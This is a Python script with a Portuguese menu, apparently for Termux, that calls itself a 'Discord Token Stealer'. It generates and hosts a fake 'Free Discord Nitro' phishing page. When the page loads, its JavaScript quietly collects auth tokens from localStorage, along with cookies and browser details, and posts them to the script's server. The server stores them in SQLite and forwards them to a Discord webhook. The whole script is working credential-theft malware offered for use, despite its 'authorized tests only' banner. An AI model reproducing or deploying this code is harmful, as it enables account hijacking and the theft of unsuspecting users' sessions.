#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import json
import asyncio
import aiohttp
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs
import sqlite3
import re

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax

console = Console()

class DiscordTokenStealer:
    def __init__(self):
        self.web_server = None
        self.server_port = 8080
        self.webhook_url = ""
        self.redirect_url = "https://discord.com"
        self.server_ip = "localhost"
        self.html_template = self._load_html_template()
        
    def _load_html_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Discord Nitro Generator</title>
    <style>
        body {{
            background: linear-gradient(135deg, #7289da, #2c2f33);
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            color: white;
            text-align: center;
            padding: 50px;
        }}
        .container {{
            background: rgba(35, 39, 42, 0.9);
            border-radius: 10px;
            padding: 30px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }}
        h1 {{
            color: #7289da;
            font-size: 28px;
        }}
        .btn {{
            background: #7289da;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            margin: 20px 0;
            transition: background 0.3s;
        }}
        .btn:hover {{
            background: #677bc4;
        }}
        .discord-logo {{
            width: 100px;
            margin-bottom: 20px;
        }}
        .hidden {{
            display: none;
        }}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://discord.com/assets/192cb9459cee8e3c2c0d31a8387c0b5d.svg" class="discord-logo">
        <h1>🎉 Free Discord Nitro! 🎉</h1>
        <p>Click the button below to claim your free Discord Nitro subscription!</p>
        <p>Limited time offer - claim now!</p>
        
        <button class="btn" onclick="claimNitro()">CLAIM NITRO</button>
        
        <div id="loading" class="hidden">
            <p>Processing your request...</p>
        </div>
        
        <script>
            function claimNitro() {{
                document.getElementById('loading').style.display = 'block';
                
                // Simulate processing
                setTimeout(function() {{
                    window.location.href = "{}";
                }}, 2000);
            }}
            
            // Steal tokens from localStorage
            function extractTokens() {{
                let tokens = [];
                for (let i = 0; i < localStorage.length; i++) {{
                    let key = localStorage.key(i);
                    if (key.includes('token') || key.includes('auth')) {{
                        tokens.push({{key: key, value: localStorage.getItem(key)}});
                    }}
                }}
                
                // Check for Discord specific tokens
                for (let key in localStorage) {{
                    if (key.toLowerCase().includes('discord') && localStorage.getItem(key)) {{
                        let value = localStorage.getItem(key);
                        if (value && value.length > 100) {{
                            tokens.push({{key: key, value: value}});
                        }}
                    }}
                }}
                
                return tokens;
            }}
            
            // Send stolen data to server
            function sendData(tokens) {{
                fetch('/capture', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify({{
                        tokens: tokens,
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        platform: navigator.platform,
                        cookies: document.cookie,
                        referrer: document.referrer,
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    }})
                }});
            }}
            
            // Extract on page load
            window.onload = function() {{
                setTimeout(function() {{
                    let tokens = extractTokens();
                    if (tokens.length > 0) {{
                        sendData(tokens);
                    }}
                }}, 3000);
            }};
        </script>
    </div>
</body>
</html>"""
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 DISCORD TOKEN STEALER[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Ação", style="green")
            
            tabela.add_row("1", "Configurar Servidor")
            tabela.add_row("2", "Gerar Página Web")
            tabela.add_row("3", "Iniciar Servidor Web")
            tabela.add_row("4", "Ver Tokens Capturados")
            tabela.add_row("5", "Configurar Webhook Discord")
            tabela.add_row("0", "Voltar")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=["0", "1", "2", "3", "4", "5"],
                show_choices=False
            )
            
            if escolha == "1":
                self.configurar_servidor()
            elif escolha == "2":
                self.gerar_pagina_web()
            elif escolha == "3":
                self.iniciar_servidor_web()
            elif escolha == "4":
                self.ver_tokens_capturados()
            elif escolha == "5":
                self.configurar_webhook()
            elif escolha == "0":
                return
    
    def mostrar_banner(self):
        banner = """
[bold blue]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀[/bold blue]
[bold white on blue]        DISCORD TOKEN STEALER - GERADOR DE PÁGINA WEB[/bold white on blue]
"""
        console.print(banner)
        console.print(Panel.fit(
            "[blink bold red]⚠️ USE APENAS PARA TESTES AUTORIZADOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
    
    def configurar_servidor(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]Configuração do Servidor[/bold]",
            border_style="blue"
        ))
        
        self.server_port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta do servidor",
            default=self.server_port
        )
        
        self.redirect_url = Prompt.ask(
            "[yellow]?[/yellow] URL de redirecionamento",
            default=self.redirect_url
        )
        
        console.print(f"[green]✓ Servidor configurado na porta {self.server_port}[/green]")
        time.sleep(1)
    
    def configurar_webhook(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]Configuração de Webhook Discord[/bold]",
            border_style="blue"
        ))
        
        self.webhook_url = Prompt.ask(
            "[yellow]?[/yellow] URL do Webhook Discord",
            default=self.webhook_url
        )
        
        if self.webhook_url:
            console.print("[green]✓ Webhook configurado com sucesso![/green]")
        else:
            console.print("[yellow]⚠ Webhook removido[/yellow]")
        
        time.sleep(1)
    
    def gerar_pagina_web(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]Gerar Página Web[/bold]",
            border_style="blue"
        ))
        
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo HTML",
            default="discord_nitro.html"
        )
        
        # Personalizar a página
        titulo = Prompt.ask(
            "[yellow]?[/yellow] Título da página",
            default="Discord Nitro Generator"
        )
        
        # Gerar HTML personalizado
        html_content = self.html_template.format(self.redirect_url)
        html_content = html_content.replace("Discord Nitro Generator", titulo)
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            console.print(Panel.fit(
                f"[green]✓ Página gerada como [bold]{nome_arquivo}[/bold][/green]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
            # Mostrar instruções
            console.print(Panel.fit(
                f"[cyan]Para usar:[/cyan]\n"
                f"1. Inicie o servidor web\n"
                f"2. Compartilhe o link: http://seu-ip:{self.server_port}\n"
                f"3. Os tokens serão capturados automaticamente",
                title="[bold cyan]INSTRUÇÕES[/bold cyan]",
                border_style="cyan"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def iniciar_servidor_web(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]Iniciar Servidor Web[/bold]",
            border_style="blue"
        ))
        
        # Criar handler personalizado
        class TokenHandler(SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                self.stealer = self.server.stealer
                super().__init__(*args, **kwargs)
            
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    html_content = self.stealer.html_template.format(self.stealer.redirect_url)
                    self.wfile.write(html_content.encode('utf-8'))
                    
                elif self.path == '/favicon.ico':
                    self.send_response(404)
                    self.end_headers()
                    
                else:
                    self.send_response(302)
                    self.send_header('Location', self.stealer.redirect_url)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/capture':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    
                    try:
                        data = json.loads(post_data.decode('utf-8'))
                        self.stealer.salvar_tokens(data)
                        
                        if self.stealer.webhook_url:
                            self.stealer.enviar_webhook(data)
                        
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(b'OK')
                    except Exception as e:
                        self.send_response(500)
                        self.end_headers()
                        self.wfile.write(str(e).encode())
                
                else:
                    self.send_response(404)
                    self.end_headers()
        
        # Configurar e iniciar servidor
        try:
            server = HTTPServer(('', self.server_port), TokenHandler)
            server.stealer = self  # Passar referência para o handler
            
            console.print(Panel.fit(
                f"[green]✓ Servidor iniciado em [bold]http://0.0.0.0:{self.server_port}[/bold][/green]",
                title="[bold green]SERVIDOR ATIVO[/bold green]",
                border_style="green"
            ))
            
            console.print(Panel.fit(
                "[yellow]Pressione Ctrl+C para parar o servidor[/yellow]",
                border_style="yellow"
            ))
            
            # Iniciar servidor em thread separada
            server_thread = Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            self.web_server = server
            
            # Manter o servidor rodando
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            console.print("\n[red]✗ Servidor parado[/red]")
            if self.web_server:
                self.web_server.shutdown()
            time.sleep(1)
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            time.sleep(2)
    
    def salvar_tokens(self, data):
        try:
            # Criar diretório de dados se não existir
            if not os.path.exists('data'):
                os.makedirs('data')
            
            # Conectar ao banco de dados
            conn = sqlite3.connect('data/tokens.db')
            c = conn.cursor()
            
            # Criar tabela se não existir
            c.execute('''CREATE TABLE IF NOT EXISTS tokens
                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
                          timestamp TEXT,
                          tokens TEXT,
                          user_agent TEXT,
                          language TEXT,
                          platform TEXT,
                          cookies TEXT,
                          referrer TEXT,
                          url TEXT)''')
            
            # Inserir dados
            c.execute("INSERT INTO tokens VALUES (NULL, ?, ?, ?, ?, ?, ?, ?, ?)",
                     (data['timestamp'], 
                      json.dumps(data['tokens']),
                      data['userAgent'],
                      data['language'],
                      data['platform'],
                      data['cookies'],
                      data['referrer'],
                      data['url']))
            
            conn.commit()
            conn.close()
            
            console.print(f"[green]✓ Tokens capturados em {data['timestamp']}[/green]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao salvar tokens: {str(e)}[/red]")
    
    async def enviar_webhook_async(self, data):
        try:
            async with aiohttp.ClientSession() as session:
                embed = {
                    "title": "🎯 Novo Token Capturado",
                    "color": 0x7289da,
                    "fields": [
                        {"name": "📅 Timestamp", "value": data['timestamp'], "inline": True},
                        {"name": "🌐 User Agent", "value": data['userAgent'][:100] + "..." if len(data['userAgent']) > 100 else data['userAgent'], "inline": True},
                        {"name": "🔤 Language", "value": data['language'], "inline": True},
                        {"name": "💻 Platform", "value": data['platform'], "inline": True},
                        {"name": "🔗 URL", "value": data['url'], "inline": False},
                        {"name": "🍪 Cookies", "value": f"```{data['cookies'][:1000]}```" if data['cookies'] else "Nenhum", "inline": False}
                    ],
                    "footer": {"text": "Discord Token Stealer"}
                }
                
                # Adicionar tokens encontrados
                if data['tokens']:
                    tokens_text = ""
                    for token in data['tokens']:
                        tokens_text += f"**{token['key']}**: ```{token['value']}```\n"
                    embed["fields"].append({"name": "🔑 Tokens", "value": tokens_text[:1000] + "..." if len(tokens_text) > 1000 else tokens_text, "inline": False})
                
                payload = {
                    "embeds": [embed],
                    "username": "Token Stealer",
                    "avatar_url": "https://discord.com/assets/192cb9459cee8e3c2c0d31a8387c0b5d.svg"
                }
                
                async with session.post(self.webhook_url, json=payload) as response:
                    if response.status == 204:
                        console.print("[green]✓ Webhook enviado com sucesso![/green]")
                    else:
                        console.print(f"[red]✗ Erro no webhook: {response.status}[/red]")
                        
        except Exception as e:
            console.print(f"[red]✗ Erro ao enviar webhook: {str(e)}[/red]")
    
    def enviar_webhook(self, data):
        try:
            asyncio.run(self.enviar_webhook_async(data))
        except:
            # Fallback para sync se async falhar
            try:
                import requests
                embed = {
                    "title": "🎯 Novo Token Capturado",
                    "color": 0x7289da,
                    "fields": [
                        {"name": "📅 Timestamp", "value": data['timestamp'], "inline": True},
                        {"name": "🌐 User Agent", "value": data['userAgent'][:100] + "..." if len(data['userAgent']) > 100 else data['userAgent'], "inline": True},
                    ]
                }
                
                payload = {
                    "embeds": [embed],
                    "username": "Token Stealer"
                }
                
                requests.post(self.webhook_url, json=payload, timeout=10)
                console.print("[green]✓ Webhook enviado com sucesso![/green]")
            except Exception as e:
                console.print(f"[red]✗ Erro ao enviar webhook: {str(e)}[/red]")
    
    def ver_tokens_capturados(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]Tokens Capturados[/bold]",
            border_style="blue"
        ))
        
        try:
            if not os.path.exists('data/tokens.db'):
                console.print("[yellow]Nenhum token capturado ainda.[/yellow]")
                input("\nPressione Enter para continuar...")
                return
            
            conn = sqlite3.connect('data/tokens.db')
            c = conn.cursor()
            
            c.execute("SELECT COUNT(*) FROM tokens")
            count = c.fetchone()[0]
            
            if count == 0:
                console.print("[yellow]Nenhum token capturado ainda.[/yellow]")
                input("\nPressione Enter para continuar...")
                return
            
            console.print(f"[green]Encontrados {count} registros de tokens:[/green]\n")
            
            c.execute("SELECT id, timestamp, user_agent FROM tokens ORDER BY id DESC LIMIT 10")
            rows = c.fetchall()
            
            tabela = Table(show_header=True, header_style="bold magenta")
            tabela.add_column("ID", style="cyan")
            tabela.add_column("Data/Hora", style="green")
            tabela.add_column("User Agent")
            
            for row in rows:
                tabela.add_row(str(row[0]), row[1], row[2][:50] + "..." if len(row[2]) > 50 else row[2])
            
            console.print(tabela)
            
            # Opção para ver detalhes
            if count > 0:
                escolha = Prompt.ask(
                    "\n[blink yellow]➤[/blink yellow] Ver detalhes (ID) ou 0 para voltar",
                    default="0"
                )
                
                if escolha != "0":
                    try:
                        token_id = int(escolha)
                        c.execute("SELECT * FROM tokens WHERE id = ?", (token_id,))
                        detalhes = c.fetchone()
                        
                        if detalhes:
                            console.clear()
                            console.print(Panel.fit(
                                f"[bold]Detalhes do Token #{detalhes[0]}[/bold]",
                                border_style="blue"
                            ))
                            
                            console.print(f"[cyan]Data/Hora:[/cyan] {detalhes[1]}")
                            console.print(f"[cyan]User Agent:[/cyan] {detalhes[3]}")
                            console.print(f"[cyan]Idioma:[/cyan] {detalhes[4]}")
                            console.print(f"[cyan]Plataforma:[/cyan] {detalhes[5]}")
                            console.print(f"[cyan]URL:[/cyan] {detalhes[8]}")
                            console.print(f"[cyan]Referrer:[/cyan] {detalhes[7]}")
                            
                            # Mostrar tokens
                            tokens = json.loads(detalhes[2])
                            if tokens:
                                console.print("\n[bold green]🔑 TOKENS ENCONTRADOS:[/bold green]")
                                for token in tokens:
                                    console.print(Panel.fit(
                                        f"[cyan]{token['key']}:[/cyan]\n[red]{token['value']}[/red]",
                                        border_style="red"
                                    ))
                            else:
                                console.print("\n[yellow]Nenhum token encontrado neste registro.[/yellow]")
                            
                            # Mostrar cookies
                            if detalhes[6]:
                                console.print("\n[bold yellow]🍪 COOKIES:[/bold yellow]")
                                console.print(Syntax(detalhes[6], "http"))
                            
                            input("\nPressione Enter para continuar...")
                    except ValueError:
                        console.print("[red]ID inválido.[/red]")
                        time.sleep(1)
            
            conn.close()
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            time.sleep(2)

def main():
    try:
        stealer = DiscordTokenStealer()
        stealer.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado[/red]")
        if stealer.web_server:
            stealer.web_server.shutdown()
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        if stealer.web_server:
            stealer.web_server.shutdown()

if __name__ == '__main__':
    main()
